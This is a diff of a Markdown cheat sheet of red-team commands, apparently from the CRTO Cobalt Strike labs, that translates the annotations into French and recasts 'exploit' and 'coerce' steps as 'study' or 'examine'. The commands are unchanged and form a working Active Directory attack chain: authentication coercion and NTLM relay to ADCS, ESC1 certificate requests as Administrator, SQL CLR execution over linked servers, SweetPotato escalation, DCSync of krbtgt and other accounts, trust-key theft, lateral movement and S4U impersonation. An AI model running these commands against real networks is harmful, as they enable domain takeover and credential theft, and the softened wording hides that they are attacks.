+>Dépannage du proxy SOCKS dans le Beacon  
 ```
 socks stop
 ```
->Cleanup Socks proxy, firewall, services, port forwarding  
+>Nettoyage du proxy SOCKS, du pare-feu, des services et des redirections de ports  
 ```
 rportfwd stop 445
 
@@ -569,19 +569,19 @@ sc_start lanmanserver
 powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
 ```
 
-## Coerce Relay  
+## Coerce et Relay  
 
 >OPSEC-🟠CAUTION  
->Coerce DC to authenticate to Web Server  
+>Examiner l’authentification du DC vers le serveur web dans le scénario  
 ```cs
 spawnto x64 %windir%\sysnative\dllhost.exe
 execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
 ```
->Relay credentials for domain controller, so we request a DomainController certificate. On the Kali Linux Docker instance start `NTLMRelayX`  
+>Étudier le scénario de certificat DomainController avec `NTLMRelayX` dans le conteneur Kali  
 ```
 proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 ```
->In beacon Coerce the domain controller into authenticating to the current machine.
+>Examiner l’authentification du Domain Controller vers la machine du lab.
 ```
 execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
 ```
@@ -589,52 +589,52 @@ execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\Shar
 ## SQL  
 
 >OPSEC-🟢SAFE  
->Get information about the DB instance and your current privileges  
+>Afficher les informations SQL et les droits du compte courant  
 ```cs
 sql-info lon-db-1
 ```
->confirm SQL sysadmin before proceeding  
+>Vérifier le rôle `sysadmin` avant de poursuivre  
 ```
 sql-whoami lon-db-1
 ```
->Check the status of SQL CLR
+>Vérifier l’état de SQL CLR
 ```cs
 sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
 ```
->CLR must be enabled on the SQL instance before it will accept and run assemblies.  
+>SQL CLR doit être activé avant le chargement d’assemblies .NET.  
 ```cs
 sql-enableclr lon-db-1
 ```
->Load the CLR assembly on SQL server and execute the stored procedure.
+>Charger l’assembly CLR sur SQL Server et exécuter la procédure stockée du lab.
 ```cs
 sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
 ```
->Pipe name is set STATICALLY in Cobalt Strike GUI — Listeners > SMB listener > Pipename (C2) field. NOT set by `post-ex { set pipename }` in the Malleable C2 profile (that controls fork-and-run post-ex pipes only — completely separate).  
->Run `link` from the SQL user beacon only, not from any impersonated session — needs a valid TGT in session to auto-request CIFS ticket.  
->Lab default pipe name (original course value): `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337`  
+>Le nom de la named pipe du listener SMB est configuré dans **Cobalt Strike > Listeners**. Il est distinct du paramètre `post-ex.pipename` du Malleable C2 Profile.  
+>Dans ce scénario, la liaison utilise le Beacon disposant du contexte Kerberos requis pour l’authentification CIFS.  
+>Nom de named pipe par défaut du lab : `TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337`  
 ```cs
 // LAB (London SQL)
 link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 
 ```
->Show all SQL linked servers configured on lon-db-1
+>Lister les Linked Servers configurés sur `lon-db-1`
 ```cs
 sql-links lon-db-1
 ```
->Check your privilege level on lon-db-2 via the link
+>Vérifier les permissions sur `lon-db-2` via le lien SQL
 ```cs
 sql-whoami lon-db-1 "" lon-db-2
 ```
->Check and Enable RPC Out on the link, required for CLR execution
+>Vérifier et configurer RPC Out sur le lien SQL dans le lab
 ```cs
 sql-checkrpc lon-db-1
 sql-enablerpc lon-db-1 lon-db-2
 ```
->Execute CLR payload on lon-db-2 via the SQL link
+>Examiner l’exécution CLR sur `lon-db-2` via le Linked Server
 ```cs
 sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
 ```
->Exploit SeImpersonatePrivilege with SweetPotato and connect new beacon
+>Étudier `SeImpersonatePrivilege` et SweetPotato dans le scénario de lab
 ```cs
 execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
 connect localhost 1337
@@ -643,31 +643,31 @@ connect localhost 1337
 ## Certify  
 
 >OPSEC-🟠CAUTION  
->ADCS ESC enumeration  
+>Énumération des configurations ADCS ESC  
 ```cs
 execute-assembly C:\Tools\Certify\Certify.exe find /vulnerable
 ```
->Enumerate vulnerable templates only, suppress admin-only findings  
+>Énumérer les templates ADCS présentant des configurations à examiner  
 ```cs
 execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
 ```
->ESC1, Misconfigured Client Authentication Templates, request cert specify UPN in SAN
+>ESC1 — examiner les templates Client Authentication et le champ UPN du SAN
 ```cs
 execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
 ```
->On CA server Dump the CA's certificate 
+>Examiner le certificat de l’autorité de certification sur le serveur CA 
 ```cs
 execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
 ```
 
 ## SpawnTo  
 
->`spawnto x64 <path>` Post-Ex Fork & Run Sets the sacrificial process for the current beacon session. Affects every fork & run operation that beacon performs: `execute-assembly`,`powerpick`. overrides whatever `spawnto_x64` is set in your **Malleable C2 profile** post-ex block current beacon only  
+>`spawnto x64 <path>` définit le processus temporaire utilisé par les opérations fork-and-run du Beacon courant : `execute-assembly`,`powerpick`. remplace localement le réglage `spawnto_x64` du Malleable C2 Profile pour ce Beacon  
 ```
 spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
 ```
->`ak-settings spawnto_x64 <path>` Artifact Kit Service Binary Sets the spawnto baked into service EXE payloads generated by the Artifact Kit. Affects:
-  `jump scshell64` lateral move  
+>`ak-settings spawnto_x64 <path>` configure le champ spawnto des fichiers service EXE générés par l’Artifact Kit. Concerne :
+  `jump scshell64` Lateral Movement  
 ```cs
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 ```
@@ -675,28 +675,28 @@ ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 ## DCSync  
 
 >OPSEC-🟠CAUTION  
->Credential ticket harvest  
+>Étudier la collecte des tickets et identifiants dans le lab  
 ```cs
 dcsync contoso.com CONTOSO\Administrator
 ```
->requires DA or replication privileges, cannot get there from a user beacon  
+>nécessite des droits de réplication AD ; un Beacon utilisateur standard ne suffit pas  
 ```cs
 dcsync contoso.com CONTOSO\krbtgt
 ```
->DCSync rsteel AES256 hash  
+>Étudier le hash AES256 de `rsteel` récupéré via DCSync dans le lab  
 ```cs
 dcsync contoso.com CONTOSO\rsteel
 ```
 
 ## JUMP  
 
->Preferred JUMP method, `scshell64` uses the service binary payload, be sure to set the `ak-settings spawnto_x64` before JUMP.  
+>Dans ce lab, `scshell64` utilise le binaire service généré par l’Artifact Kit et le paramètre `ak-settings spawnto_x64`.  
 ```
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 jump scshell64 lon-dc-1 smb
 ```
->Jump to target with WinRM, no service modification, no disk write  
->Using WinRM to create new beacon  
+>Étudier le Jump WinRM, sans modification de service dans ce scénario  
+>Étudier la création d’un nouveau Beacon via WinRM  
 ```cs
 jump winrm64 lon-dc-1.contoso.com smb
 jump winrm64 lon-ws-1 smb
@@ -705,15 +705,15 @@ jump winrm64 lon-ws-1 smb
 ## Execute    
 
 >OPSEC-🔴UNSAFE
->Trigger GPO refresh to test persistence fires spawns `gpupdate.exe` child process   
+>Déclencher le rafraîchissement GPO du lab avec `gpupdate.exe` pour observer le comportement   
 ```cs
 execute gpupdate /target:computer /force
 ```
 
-## Get System  
+## Obtenir SYSTEM  
 
 >OPSEC-🔴UNSAFE
->if SYSTEM privilege escalation needed  
+>Si l’exercice nécessite une élévation vers SYSTEM  
 ```cs
 getsystem
 ```
@@ -721,14 +721,14 @@ getsystem
 ## Mimikatz  
 
 >OPSEC-🔴UNSAFE  
->DCSync shared inter-realm key from the TDO  Trust Domain Object  
+>Examiner le secret de confiance inter-realm associé à l’objet TDO  
 ```
 mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
 ```
 
-# CRTO Lab Commands
+# Commandes des labs CRTO
 
->Outbound Trusts  
+>Relations de confiance sortantes  
 ```
 ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
 ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
@@ -740,7 +740,7 @@ krb_asktgt /user:PARTNER$ /rc4:[TRUST KEY] /domain:contoso.com /dc:lon-dc-1.cont
 ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
 ```
 
->Inbound Trusts
+>Relations de confiance entrantes
 ```
 ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
 ldapsearch (objectClass=foreignSecurityPrincipal) --attributes objectSid,memberOf --hostname partner.com --dn DC=partner,DC=com
@@ -765,7 +765,7 @@ krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par
 ls \\\\par-jmp-1.partner.com\\c$
 ```
 
->Parent Child Trusts
+>Relations de confiance parent-enfant
 ```
 ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
 
@@ -781,7 +781,7 @@ run klist
 ls \\\\lon-dc-1\\c$
 ```
 
->DPERSIST1 for Domain Persistence Golden Certificates, admin persistence
+>DPERSIST1 — Golden Certificates et Persistence dans le domaine
 ```
 execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-self --dump-certs --quiet
 
@@ -920,7 +920,7 @@ execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\Shar
 krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
 ```
 
->Service Name Substitution
+>Substitution du nom de service
 ```
 krb_s4u /ticket:[TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
 ```
